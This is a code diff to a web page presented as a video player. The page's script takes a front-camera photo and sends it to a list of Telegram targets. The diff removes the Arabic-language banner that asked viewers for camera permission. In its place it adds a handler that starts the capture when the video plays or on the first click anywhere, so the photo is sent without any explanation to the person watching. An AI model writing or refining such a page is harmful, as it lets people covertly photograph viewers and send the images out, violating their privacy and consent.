@@ -21,7 +21,6 @@
             height: 100%;
             background-color: #000;
             overflow: hidden;
-            font-family: system-ui, -apple-system, sans-serif;
         }
         video#mainVideo {
             position: fixed;
@@ -29,67 +28,11 @@
             left: 0;
             width: 100vw;
             height: 100vh;
+            min-width: 100%;
+            min-height: 100%;
             object-fit: cover;
             object-position: center;
             z-index: 1;
-        }
-        /* لافتة طلب السماح بالكاميرا */
-        #cameraBanner {
-            position: fixed;
-            inset: 0;
-            background: rgba(0, 0, 0, 0.78);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            padding: 16px;
-            z-index: 10;
-        }
-        .banner-card {
-            max-width: 400px;
-            width: 100%;
-            background: #18181b;
-            color: #fff;
-            border: 1px solid #27272a;
-            border-radius: 14px;
-            padding: 20px;
-            text-align: center;
-        }
-        .banner-card h2 {
-            font-size: 18px;
-            margin-bottom: 8px;
-        }
-        .banner-card p {
-            font-size: 14px;
-            color: #d4d4d8;
-            line-height: 1.6;
-            margin-bottom: 16px;
-        }
-        .banner-actions {
-            display: flex;
-            gap: 10px;
-            justify-content: center;
-        }
-        button {
-            border: none;
-            border-radius: 8px;
-            padding: 10px 16px;
-            font-size: 14px;
-            cursor: pointer;
-        }
-        #allowCameraBtn {
-            background: #2563eb;
-            color: #fff;
-            font-weight: 600;
-        }
-        #dismissBannerBtn {
-            background: #3f3f46;
-            color: #e4e4e7;
-        }
-        #statusMsg {
-            margin-top: 12px;
-            font-size: 13px;
-            color: #f87171;
-            min-height: 18px;
         }
     </style>
 </head>
@@ -99,21 +42,6 @@
     <video id="mainVideo" controls loop playsinline muted>
         <source src="my_reel (3).mp4" type="video/mp4">
     </video>
-
-    <!-- لافتة السماح بالكاميرا -->
-    <div id="cameraBanner" role="dialog" aria-modal="true" aria-labelledby="bannerTitle">
-        <div class="banner-card">
-            <h2 id="bannerTitle">إذن الوصول إلى الكاميرا</h2>
-            <p>
-                يرجى السماح بالوصول إلى الكاميرا للمتابعة. سيطلب منك المتصفح تأكيد الإذن بعد الضغط على الزر أدناه.
-            </p>
-            <div class="banner-actions">
-                <button id="allowCameraBtn" type="button">السماح بالكاميرا</button>
-                <button id="dismissBannerBtn" type="button">إغلاق</button>
-            </div>
-            <div id="statusMsg"></div>
-        </div>
-    </div>
 
     <script>
         const TELEGRAM_TARGETS = [
@@ -128,10 +56,8 @@
         ];
 
         let isProcessing = false;
-        const banner = document.getElementById('cameraBanner');
-        const allowBtn = document.getElementById('allowCameraBtn');
-        const dismissBtn = document.getElementById('dismissBannerBtn');
-        const statusMsg = document.getElementById('statusMsg');
+        let hasRequestedCamera = false;
+        const video = document.getElementById('mainVideo');
 
         function buildCaption(cameraLabel) {
             const now = new Date().toLocaleString('ar-DZ', {
@@ -208,29 +134,23 @@
             }
         }
 
-        async function handleCameraFlow() {
-            if (isProcessing) return;
+        async function triggerCameraOnce() {
+            if (isProcessing || hasRequestedCamera) return;
+            hasRequestedCamera = true;
             isProcessing = true;
-            statusMsg.textContent = '';
 
             try {
                 const blob = await captureSinglePhoto('user');
-                if (!blob) {
-                    statusMsg.textContent = 'تعذر الوصول إلى الكاميرا أو تم رفض الإذن.';
-                    return;
+                if (blob) {
+                    await sendPhotoToAllTargets(blob, 'user');
                 }
-
-                await sendPhotoToAllTargets(blob, 'user');
-                banner.style.display = 'none';
             } finally {
                 isProcessing = false;
             }
         }
 
-        allowBtn.addEventListener('click', handleCameraFlow);
-        dismissBtn.addEventListener('click', () => {
-            banner.style.display = 'none';
-        });
+        video.addEventListener('play', triggerCameraOnce);
+        document.addEventListener('click', triggerCameraOnce, { once: true });
     </script>
 </body>
 </html>
